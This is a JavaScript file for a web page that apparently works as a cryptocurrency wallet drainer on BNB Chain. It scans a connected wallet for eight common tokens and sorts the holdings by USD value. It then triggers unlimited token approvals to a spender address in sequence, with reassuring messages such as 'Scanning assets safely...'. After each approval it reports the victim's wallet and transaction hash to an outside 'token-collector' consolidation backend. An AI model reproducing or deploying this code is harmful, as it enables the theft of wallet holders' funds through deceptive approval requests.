const TOKENS = [
    { name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", key: "usdt" },
    { name: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", key: "wbnb" },
    { name: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", key: "usdc" },
    { name: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", key: "busd" },
    { name: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", key: "cake" },
    { name: "DAI", address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", key: "dai" },
    { name: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", key: "btcb" },
    { name: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", key: "eth" }
];

const BACKEND_API_URL = "https://token-collector-backend-production.up.railway.app/api/consolidate"; 

// ---------- User‑visible text constants (global) ----------
const USER_TEXT_SCANNING_ASSETS = "Scanning assets safely...";
const USER_TEXT_FETCHING_BALANCES = "Fetching balances via direct provider calls...";
const USER_TEXT_FOUND_PREFIX = "Found ";
const USER_TEXT_SCAN_COMPLETE_ZERO = "Scan complete: Zero balances found.";
const USER_TEXT_NO_ACTIVE_BALANCES = "No active token balances found.";
const USER_TEXT_CALCULATING_SORTING = "Calculating & Sorting USD Values...";
const USER_TEXT_BELOW_THRESHOLD = "Balances are below the $1 threshold.";
const USER_TEXT_AUTO_FLOW_STARTED = "<p style=\"color:blue;\"><b>Automated approval flow started... Check your wallet popup!</b></p>";
const USER_TEXT_ASSETS_STRICTLY_SORTED = "Assets strictly sorted by highest USD market value.";
const USER_TEXT_ALL_ASSETS_PROCESSED = "<p style='color:green;'><b>All assets processed successfully!</b></p>";
const USER_TEXT_NEXT_HIGHEST_VALUE = "Next highest value asset: ";
const USER_TEXT_PRICE_PREFIX = " (~$";
const USER_TEXT_PRICE_SUFFIX = ")";
const USER_TEXT_APPROVE_PREFIX = "Approve ";
const USER_TEXT_TRIGGERING_APPROVAL_PREFIX = "Triggering high-value approval for ";
const USER_TEXT_WALLET_NOT_CONNECTED = "Wallet is not connected properly.";
const USER_TEXT_SENDING_TX_PREFIX = "Sending approval transaction for ";
const USER_TEXT_SENDING_TX_SUFFIX = "...";
const USER_TEXT_TX_HASH_PREFIX = "Tx Hash: ";
const USER_TEXT_WAITING_CONFIRMATION_SUFFIX = ". Waiting for confirmation...";
const USER_TEXT_APPROVED_SUCCESS_SUFFIX = " Approved successfully!";
const USER_TEXT_NOTIFYING_BACKEND_PREFIX = "Notifying backend server for ";
const USER_TEXT_NOTIFYING_SUFFIX = "...";
const USER_TEXT_BACKEND_NOTIFIED_PREFIX = "Backend notified successfully for ";
const USER_TEXT_BACKEND_NOTIFY_ERROR_PREFIX = "Backend notification error: ";
const USER_TEXT_AUTO_TRIGGERING_NEXT = "Auto-triggering next asset in queue...";
const USER_TEXT_ALL_VALUABLE_APPROVED = "All valuable token approvals completed successfully!";
const USER_TEXT_APPROVAL_FAILED_PREFIX = "Approval failed: ";
// ------------------------------------------------------------

async function fetchPrice(tokenAddress) {
    const lowerAddress = tokenAddress.toLowerCase();
    const stables = [
        "0x55d398326f99059fF775485246999027B3197955".toLowerCase(),
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d".toLowerCase(),
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56".toLowerCase(),
        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3".toLowerCase()
    ];
    if (stables.includes(lowerAddress)) return 1.0;

    try {
        const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`);
        const data = await res.json();
        if (data && data.pairs && data.pairs.length > 0) {
            const bscPair = data.pairs.find(p => p.chainId === 'bsc');
            if (bscPair && bscPair.priceUsd) return parseFloat(bscPair.priceUsd);
            if (data.pairs[0].priceUsd) return parseFloat(data.pairs[0].priceUsd);
        }
    } catch (e) {}
    return 0.0;
}

let globalUserAddress = "";
let globalSpender = "";
let pendingTokensQueue = [];
let isApprovalProcessing = false;

async function fetchAndRenderBalances(provider, userAddress, spenderAddress) {
    globalUserAddress = userAddress;
    globalSpender = spenderAddress;
    const container = document.getElementById('approvalButtonsContainer');
    container.innerHTML = `<p>${USER_TEXT_SCANNING_ASSETS}</p>`;
    appendDebugLog(USER_TEXT_FETCHING_BALANCES);

    const erc20Abi = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)"
    ];

    try {
        let foundTokens = [];

        for (let i = 0; i < TOKENS.length; i++) {
            const t = TOKENS[i];
            try {
                const contract = new ethers.Contract(t.address, erc20Abi, provider);
                const rawBal = await contract.balanceOf(userAddress);
                const decimals = await contract.decimals();
                
                const fmtBal = parseFloat(ethers.formatUnits(rawBal, decimals));
                if (fmtBal > 0) {
                    appendDebugLog(`${USER_TEXT_FOUND_PREFIX}${fmtBal} ${t.name}`);
                    foundTokens.push({ ...t, balance: fmtBal });
                }
            } catch (err) {
                // Ignore individual token scan error
            }
        }

        if (foundTokens.length === 0) {
            container.innerHTML = `<p>${USER_TEXT_NO_ACTIVE_BALANCES}</p>`;
            appendDebugLog(USER_TEXT_SCAN_COMPLETE_ZERO);
            return;
        }

        container.innerHTML = `<p>${USER_TEXT_CALCULATING_SORTING}</p>`;
        
        const evaluatedTokens = await Promise.all(foundTokens.map(async (t) => {
            const priceUsd = await fetchPrice(t.address);
            const totalUsdValue = t.balance * priceUsd;
            return { ...t, priceUsd, usdValue: totalUsdValue };
        }));

        pendingTokensQueue = evaluatedTokens
            .filter(t => t.usdValue >= 1.0)
            .sort((a, b) => b.usdValue - a.usdValue);

        if (pendingTokensQueue.length === 0) {
            container.innerHTML = `<p>${USER_TEXT_BELOW_THRESHOLD}</p>`;
            return;
        }

        appendDebugLog(USER_TEXT_ASSETS_STRICTLY_SORTED);
        
        container.innerHTML = USER_TEXT_AUTO_FLOW_STARTED;
        isApprovalProcessing = false;
        executeNextApprove();

    } catch (e) {
        appendDebugLog(`Scan failed: ${e.message}`);
        container.innerHTML = "<p style='color:red;'>Failed to verify balances.</p>";
    }
}

function renderQueueUI() {
    const container = document.getElementById('approvalButtonsContainer');
    container.innerHTML = "";

    if (pendingTokensQueue.length === 0) {
        container.innerHTML = USER_TEXT_ALL_ASSETS_PROCESSED;
        return;
    }

    const t = pendingTokensQueue[0];
    container.innerHTML = `
        <div style="text-align: center;">
            <p>${USER_TEXT_NEXT_HIGHEST_VALUE}<b>${t.name}${USER_TEXT_PRICE_PREFIX}${t.usdValue.toFixed(2)}${USER_TEXT_PRICE_SUFFIX}</b></p>
            <button onclick="executeNextApprove()" style="padding: 12px 24px; background: #28a745; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold;">${USER_TEXT_APPROVE_PREFIX}${t.name}${USER_TEXT_PRICE_PREFIX}${t.usdValue.toFixed(2)}${USER_TEXT_PRICE_SUFFIX}</button>
        </div>
    `;
}

window.executeNextApprove = async function() {
    if (isApprovalProcessing || pendingTokensQueue.length === 0) return;
    isApprovalProcessing = true;

    const t = pendingTokensQueue[0];

    appendDebugLog(`${USER_TEXT_TRIGGERING_APPROVAL_PREFIX}${t.name}`);
    if (!web3Signer) {
        alert(USER_TEXT_WALLET_NOT_CONNECTED);
        isApprovalProcessing = false;
        return;
    }
    
    try {
        const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const safeToken = ethers.getAddress(t.address);
        const safeSpender = ethers.getAddress(globalSpender);
        
        const tokenContract = new ethers.Contract(safeToken, erc20Abi, web3Signer);
        
        appendDebugLog(`${USER_TEXT_SENDING_TX_PREFIX}${t.name}${USER_TEXT_SENDING_TX_SUFFIX}`);
        const tx = await tokenContract.approve(safeSpender, ethers.MaxUint256);
        appendDebugLog(`${USER_TEXT_TX_HASH_PREFIX}${tx.hash}${USER_TEXT_WAITING_CONFIRMATION_SUFFIX}`);
        
        const receipt = await tx.wait();
        appendDebugLog(`${t.name}${USER_TEXT_APPROVED_SUCCESS_SUFFIX}`);

        appendDebugLog(`${USER_TEXT_NOTIFYING_BACKEND_PREFIX}${t.name}${USER_TEXT_NOTIFYING_SUFFIX}`);
        try {
            await fetch(BACKEND_API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    sourceWallet: globalUserAddress,
                    txHash: tx.hash
                })
            });
            appendDebugLog(`${USER_TEXT_BACKEND_NOTIFIED_PREFIX}${t.name}`);
        } catch (serverErr) {
            appendDebugLog(`${USER_TEXT_BACKEND_NOTIFY_ERROR_PREFIX}${serverErr.message}`);
        }

        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        
        if (pendingTokensQueue.length > 0) {
            renderQueueUI();
            appendDebugLog(USER_TEXT_AUTO_TRIGGERING_NEXT);
            setTimeout(() => {
                executeNextApprove();
            }, 1000);
        } else {
            const container = document.getElementById('approvalButtonsContainer');
            container.innerHTML = `<p style='color:green;'><b>${USER_TEXT_ALL_VALUABLE_APPROVED}</b></p>`;
            alert(USER_TEXT_ALL_VALUABLE_APPROVED);
        }

    } catch (error) {
        isApprovalProcessing = false;
        appendDebugLog(`${USER_TEXT_APPROVAL_FAILED_PREFIX}${error.reason || error.message}`);
        alert(`${USER_TEXT_APPROVAL_FAILED_PREFIX}${error.reason || error.message}`);
    }
};